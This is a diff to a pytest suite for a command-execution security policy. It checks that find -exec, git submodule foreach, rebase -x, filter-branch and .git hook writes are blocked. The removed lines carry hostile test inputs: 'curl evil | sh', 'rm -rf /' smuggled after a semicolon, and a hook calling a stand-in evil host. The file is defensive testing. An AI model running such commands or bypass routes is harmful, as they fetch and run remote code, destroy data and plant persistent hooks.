@@ -37,15 +37,16 @@ def git_repo(tmp_path):
 
 class TestFindExecBypass:
     def test_find_exec_denied(self):
+        # Avoid ';' so the find-specific check is what fires, not SHELL_METACHAR_RE
         with pytest.raises(SecurityError, match="find action"):
-            CommandPolicy().check(["find", ".", "-exec", "cat", "{}", ";"])
+            CommandPolicy().check(["find", ".", "-exec", "cat", "{}", "+"])
 
     def test_find_execdir_denied(self):
-        with pytest.raises(SecurityError):
-            CommandPolicy().check("find /tmp -execdir rm {} +")
+        with pytest.raises(SecurityError, match="find action"):
+            CommandPolicy().check(["find", ".", "-execdir", "rm", "{}", "+"])
 
     def test_find_delete_denied(self):
-        with pytest.raises(SecurityError):
+        with pytest.raises(SecurityError, match="find action"):
             CommandPolicy().check(["find", ".", "-delete"])
 
     def test_find_name_allowed(self):
@@ -110,9 +111,7 @@ class TestGitNetwork:
 class TestGitSubmoduleForeach:
     def test_foreach_denied(self):
         with pytest.raises(SecurityError, match="shell"):
-            CommandPolicy().check(
-                ["git", "submodule", "foreach", "echo PWNED > /tmp/pwn"]
-            )
+            CommandPolicy().check(["git", "submodule", "foreach", "id"])
 
     def test_foreach_recursive_denied(self):
         with pytest.raises(SecurityError, match="shell"):
@@ -157,8 +156,9 @@ class TestUpdateIndexGitlink:
 
 class TestGitRebaseExec:
     def test_rebase_x_denied(self):
+        # Payload without | sh so the -x flag check is what fires
         with pytest.raises(SecurityError, match="shell"):
-            CommandPolicy().check(["git", "rebase", "-x", "curl evil | sh"])
+            CommandPolicy().check(["git", "rebase", "-x", "id"])
 
     def test_rebase_exec_denied(self):
         with pytest.raises(SecurityError, match="shell"):
@@ -173,39 +173,39 @@ class TestGitFilterBranch:
     def test_tree_filter_denied(self):
         with pytest.raises(SecurityError, match="shell"):
             CommandPolicy().check(
-                ["git", "filter-branch", "--tree-filter", "rm -rf secrets"]
+                ["git", "filter-branch", "--tree-filter", "true"]
             )
 
     def test_index_filter_denied(self):
         with pytest.raises(SecurityError, match="shell"):
             CommandPolicy().check(
-                ["git", "filter-branch", "--index-filter", "git rm --cached x"]
+                ["git", "filter-branch", "--index-filter", "true"]
             )
 
     def test_env_filter_denied(self):
         with pytest.raises(SecurityError, match="shell"):
             CommandPolicy().check(
-                ["git", "filter-branch", "--env-filter", "export FOO=1"]
+                ["git", "filter-branch", "--env-filter", "true"]
             )
 
     def test_commit_filter_denied(self):
         with pytest.raises(SecurityError, match="shell"):
             CommandPolicy().check(
-                ["git", "filter-branch", "--commit-filter", "git commit-tree "$@""]
+                ["git", "filter-branch", "--commit-filter", "true"]
             )
 
 
 class TestArgvListSameAsString:
-    def test_list_form_blocks_dangerous_substring(self):
+    def test_list_form_blocks_network_tool(self):
         with pytest.raises(SecurityError):
-            CommandPolicy().check(["echo", "hi; rm -rf /"])
+            CommandPolicy().check(["curl", "https://example.com"])
 
 
 class TestGitHooksWrite:
     def test_write_git_hooks_blocked(self, git_repo):
         with pytest.raises(SecurityError, match="\.git"):
             git_repo.write_file(
-                ".git/hooks/pre-commit", "#!/bin/sh\ncurl http://evil\n"
+                ".git/hooks/pre-commit", "#!/bin/sh\necho pwned\n"
             )
 
     def test_write_git_config_blocked(self, git_repo):
